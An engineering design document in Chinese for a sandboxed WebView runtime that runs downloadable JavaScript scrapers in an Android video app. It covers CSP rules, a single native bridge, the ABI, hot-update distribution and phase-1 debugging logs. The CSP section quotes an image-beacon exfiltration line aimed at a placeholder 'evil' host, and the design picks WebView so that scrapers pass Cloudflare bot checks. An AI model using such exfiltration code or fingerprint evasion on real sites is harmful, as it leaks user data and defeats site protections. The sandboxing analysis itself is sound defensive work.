# Spider 运行时：设计（2026-10-19 草案）

**目标**：让源变成可下发的 JS，而不是编译进 APK 的 Java 类。加一个源不重新发版。

**边界（先说清楚）**：不做 `DexClassLoader`。不执行下载的 dex / so / jar。
这不是「安全考虑」这四个字能概括的，见 §9。

---

## 一、结论

| 决策 | 选择 | 一句话理由 |
|---|---|---|
| 执行引擎 | **WebView**（专用隐藏页） | 现成的 TLS 指纹栈 —— 一半的源卡在 Cloudflare 上，Rhino 过不去 |
| 数据模型 | **我们自己的**（15 个角色 + 6 个结构） | `web.fields` 已经是它的雏形，见上一轮讨论 |
| TVBox 兼容 | **只做入站格式 + JS spider 的 `req/rule` 垫片** | `Vod` 是传输格式，不是领域模型 |
| ABI 版本 | `abiVersion` + spider 声明 `requires` | 冻接口只加不破，否则热更下发的源会被新版壳打碎 |

---

## 二、为什么是 WebView，不是 Rhino / QuickJS

写过一版对比，决定性的一条不是性能，是**能不能拿到站点的响应**：

| | WebView | Rhino（纯 Java） | QuickJS（JNI） |
|---|---|---|---|
| TLS 指纹 | Chrome 真的指纹 | 还是 OkHttp 的指纹 | 还是自己的栈 |
| Cloudflare 站 | 能过（`SiteFetchWebView` 已经在用这条路） | 过不去 | 过不去 |
| 新增依赖 | 0 | 1MB jar | 自带 so，四个 ABI 各一份 |
| 隔离手段 | CSP + 只暴露一个 bridge + 禁导航 | 关掉 Java 访问（`ClassShutter`） | 无 DOM，最干净 |
| 与现有代码 | 复用热更、`SiteFetchWebView` 的超时/回收套路 | 全新 | 全新 |

「过不去 Cloudflare」= 一半的源直接不可用。这个项目已经为这件事付出了代价
（`SiteFetchWebView` 900 行：真页面、XHR 代打、base64 回传）。spider 运行时
如果换一个拿不到同样指纹的引擎，等于把那条路重走一遍还走不通。

**Rhino 唯一的优势是「没有 DOM 就没有 DOM 逃逸」**，但那条我们用 CSP 堵，
见 §4。

## 三、宿主页面

一个 `assets/spider-host.html`，**只有 40 行**，其余全是 CSP：

```html
<!doctype html>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'unsafe-inline' 'unsafe-eval';
  connect-src 'none';
  img-src 'none';
  style-src 'none';
  frame-src 'none';
  form-action 'none';
  base-uri 'none';
">
<script>
  // 只有这一个全局。spider 文件用 importScripts 语义加载：拼成 <script> 注入，
  // 但注入前后会把 window 上除 __spider 之外的东西清一遍。
  window.__spider = { call: (op, args) => __hgSpider.call(op, JSON.stringify(args || {})) };
</script>
```

四条 CSP 各挡一件事：

- `connect-src 'none'` —— **spider 自己发不了任何网络请求**，包括 `fetch`、`XHR`、
  `WebSocket`、`EventSource`、`sendBeacon`。所有网络必须走 `__spider.call('net', …)`。
- `img-src 'none'` —— 挡掉最经典的外带通道：`new Image().src = 'https://evil/?data=' + 偷到的东西`。
- `frame-src 'none'` + `child-src` —— 挡 iframe 套娃绕过。
- `base-uri 'none'` + `form-action 'none'` —— 挡表单外发和 base 劫持。

`script-src` 必须留 `'unsafe-eval'`：spider 是字符串注入执行的。这是允许的 ——
能执行代码的只有我们自己下发的那个文件，而文件本身是签名校验过的（§8）。

导航另有一道：`WebViewClient.shouldOverrideUrlLoading` 一律 `return true`，
`onCreateWindow` 直接拒绝。CSP 之外再上一把锁，因为它和 CSP 的覆盖面不完全重合
（老 WebView 版本对某些指令的支持有缺口）。

## 四、暴露面：一个 bridge，四个命令

```text
__hgSpider.call('net',    {url, method, headers, body})  → {ok, status, body}
__hgSpider.call('log',    {msg})                          → {}
__hgSpider.call('crypto', {algo, data, key, iv})          → {ok, hex|b64}
__hgSpider.call('done',   {cap, payload})                 → {}   ← 一次调用的终点
```

`net` 是唯一有权限碰外面的，规则和这两天刚做的 `http.hosts` **完全一样**：

1. 只放行 `https://`；
2. 主机必须在当前源声明的 `spider.hosts` 里（精确匹配，将来加通配符）；
3. 走 `AiiHttp`，所以 DoH / 代理 / h2 降级 / UA 全继承；
4. 响应体上限 4MB，超了报错而不是截断（截断的 JSON 解析错误比超时更难查）。

`done` 是终点，这个设计是刻意的：**一次能力调用只允许一个返回值**，spider 不能
「返回之后再偷偷发一个请求」。它把「异步收尾」这件事从 ABI 里彻底去掉 ——
TVBox 的 spider 到处是 `setTimeout` 收尾，那条路在进程里就是泄漏源。

## 五、ABI（和上一轮定的模型对齐）

spider 是一个文件，导出一个对象：

```js
// ui/spiders/example.js
({
  id: 'example',
  name: '示例站',
  version: 3,
  requires: '>=1',
  hosts: ['api.example.com', 'cdn.example.com'],

  async home(ctx)        { return { items: [...] }; },
  async category(ctx, {slug, page, filters}) { return { page, hasMore, items }; },
  async detail(ctx, {ref})        { return { ...card, description, episodes, lines }; },
  async search(ctx, {keyword, page}) { return { page, hasMore, items }; },
  async play(ctx, {ref, line})    { return { url, headers, alts }; },
});
```

`ctx` 就是 `__spider`（`ctx.net` / `ctx.log`），**没有** `window`、`document`、
`localStorage`。能力集（`home` / `category` / `detail` / `search` / `play`）由
导出的对象上有哪些函数决定，不再靠「配置里有没有 paths」猜。

模型本体沿用上一轮定稿的六个结构（`Site` / `Card` / `Paged` / `Detail` /
`Episode` / `Play`），这里不重复。**关键一条**：`Episode.ref` 是站点自己的标识，
不是 URL；`play` 时才解析地址。这样选集页不用等地址，死线路也能先出界面。

## 六、TVBox JS spider 兼容垫片（可选，阶段 3）

TVBox 生态里有一批纯 JS spider（catvod 那脉），形态是：

```js
var rule = { title:'x', host:'https://…', homeUrl:'…', 一级:'…', … };
function home() { return JSON.stringify({class:[…], list:[…]}) }
function detail(id) { … }
```

它们是**照着 TVBox 的宿主对象写的**：`req(url, opt)` 取页面、`pdfa`/`pd` 解析
DOM、返回值是 `Vod`。要跑起来得垫三层：

| 垫什么 | 实现 | 工作量 |
|---|---|---|
| `req(url, opt)` | 转 `ctx.net`，返回 `{content, headers, status}` | 30 行 |
| `pdfa` / `pd`（DOM 选择器） | `DOMParser` + 一层 querySelector 包装 | 80 行 |
| `Vod` → 我们的模型 | `fromVod()`：拆 `$$$`/`#`/`$`，拉平成 `lines[] + episodes[]` | 60 行 |

垫完这些，生态里「不依赖 jar 的 JS 源」就能直接吃。**这是「资源最大化」最省力
的一半** —— 剩下那一半在 jar 里，而 jar 我们不碰。

## 七、生命周期

```text
进首页 → SpiderRuntime.load(site)          // 建 WebView、注入 spider、握手
      → call('home') → 15s 超时 → 销毁页面
换源/退出 → shutdown()                      // 必须，否则渲染进程常驻
```

三条硬规矩：

1. **一次调用一个页面生命周期**。调用完就 `loadUrl("about:blank")`，不给蜘蛛
   留定时器。`SiteFetchWebView` 已经证明过：忘了这一步，渲染进程不退，视频缓冲
   和定时器都在跑，耗电和内存一起涨。
2. **超时用 `WebView.postDelayed` 的看门狗，不用 `Future.get`**。卡住的 spider
   在渲染线程里，Java 侧取消不掉，只能把整个 WebView 换掉 —— 所以超时处置是
   「杀宿主、报错、下次重建」，不是「中断它」。
3. **崩溃要能归因**。`SiteBridge` 每条命令带 `siteId` + `callId`，出错日志里
   打出来。没有这个，用户报「某站首页空白」你只能在八个源里猜。

## 八、分发

复用现成的热更链路，不新开通道：

- spider 文件放在热更包的 `ui/spiders/*.js`（`HotUpdateManager.unpack` 的
  `ui/` 白名单已经放行 `.js`，见 `2026-10-18-TVBox化改造方案.md` §三）；
- 清单里每个 spider 带 `sha256` + `version`，壳只加载清单里有的；
- `requires: '>=1'` 和壳的 `SPIDER_ABI` 比对，不满足就**拒绝加载并说明**，
  而不是跑一半崩在某个函数上；
- 单个 spider ≤ 256KB，整包上限沿用现有的 25MB。

## 九、明确不做的

**`DexClassLoader`。** 不是立场问题，是这一条的代价算不过来：

- 它要下载**可执行代码**，而我们的热更签名只覆盖「文件没被改过」，覆盖不了
  「这个文件是善意的」。用户加的每一个源都等于一次 root 授权。
- 同一个进程里有 Parse 账号、Xray 代理核心（能改设备网络出口）、WebView、
  文件读写。TVBox 是个纯播放器壳，我们是带账号和代理的壳，同样一段远程代码
  落在两者身上后果不同。
- 收益那一半我们**已经用别的方式拿到了**：`type 0/1` 的苹果CMS 源（配置层已通）、
  JS spider（本设计）、以及现有八个内置适配器。真正只剩在 jar 里的是「依赖
  native so 的解析壳」（那类 `ftyguard` 之流），那批源本身也在对抗平台。

**原生 socket。** `net` 只出 HTTP。需要 WebSocket 的源让它在 `net` 之上自己
poll，不允许碰 socket —— 一个能开任意 TCP 的 spider 等于一个代理出口。

## 十二、还没定的

1. **一张 WebView 还是每个源一张**。一张省内存但要串行化调用；每个源一张隔离好
   但渲染进程会堆积（`SiteFetchWebView` 的教训）。倾向一张 + 串行 + 每次换源重建。
2. **`crypto` 命令要不要给 AES**。给了就能解封面那类加密，但那把解密能力交给了
   下载的代码 —— 至少要限制成「只能解 base64/hex 和 md5/sha256」。
3. **spider 的调试面**。至少要能在设置页打开「spider 日志」，把 `log` 和
   `net` 的 URL 打出来。没有这个，第三方写的源没法自己排错。

## 阶段 1 的记录（2026-10-19 00:2x）

### 离线回归是这一阶段的真正产出

`scripts/spider-check.js` 把 spider 放进一个**没有 window / document / DOMParser**
的 vm 沙箱，按 URL 规则喂 `app/src/test/resources/yhdm/` 里的 fixture，跑 12 条断言：

```text
spider: yhdm v1 requires=>=1 hosts=["yhdm.one"]
✓ home 4 条   ✓ detail 6 条   ✓ play 2 条   全部通过
```

沙箱不给 DOM 是刻意的：用了 DOM API 的 spider 从此没有离线回归，只能靠真机点，
而那意味着改一行不知道坏哪。约束用沙箱强制，不靠约定。

### 真机卡在哪

启动 0.4 秒后跑 spider：

```text
[source] net yhdm.one → 代理
[http] DoH yhdm.one → 4 个地址                     ← 仍然在做本地 DNS
failed to connect to yhdm.one/2001::caa0:…（被污染的 IPv6）after 15000ms
```

`NetRoute` 判的是「代理」，但真正建客户端时用的是 `AiiHttp.effectiveRoute()`
（全局设置），而那一刻**内置核心还没起来** —— 它返回空串 = 直连。于是：

- 路由决策（per-source）和建客户端（global）是**两个真相**；
- 启动后头一两秒里，第二个真相是错的，而错的形态是「连 IPv6 连到超时」。

同一时刻 App 自己的 `/api/home` 也要 30 秒超时、靠第二次才成
（`预热完成 /api/home 32329ms`），所以出口节点也在抖，两件事叠在一起。

**修法**（三层，各管一件事）：

- `AiiHttp.routeForProxyHost`：模式是内置核心、代理串还是空的时候最多等 2.5 秒；
- `SpiderRuntime.net`：发请求前先确认核心是否就绪，最多等 3 秒，日志写清等了多久；
- `SpiderRuntime.net` 打一行路由结论，这是「App 能取、spider 取不到」唯一的诊断入口。

**验证方式也换了**：不再用命令行 extra（它只在冷启动生效，永远和核心启动赛跑），
改成内容源页底部一个真列表 —— `SpiderStore` 的结果 + 点一下跑 `home`。
真机结果：

```text
樱花动漫 · 55 张卡 · 2.3s
[source] net yhdm.one → 代理 profile=有 mode=builtin proxy=有
[spider] op=net host=yhdm.one ms=2044
[spider] cap=home ok ms=2092
```

离线 fixture 是 56 张，线上实时页面 55 张 —— 差一张是快照和现网的时间差，
不是解析问题。

### 阶段 1 的副产品

- `SpiderStore`：热更 `ui/spiders/*.js` 优先、APK assets 兜底，元信息靠扫描字面量
  而不执行 JS，`requires` 与 ABI 比对。踩掉两个坑：`indexOf("__spiderSite")` 会命中
  注释里的同名提及；`/["']/` 这类正则字面量会把字符串扫描带偏。
- `net` 加了 h2→h1 降级与一次重试（对齐 `fetchUncached`），否则出口节点抖的时候
  spider 比 App 内在路径更脆，而用户分不清两者的差别。
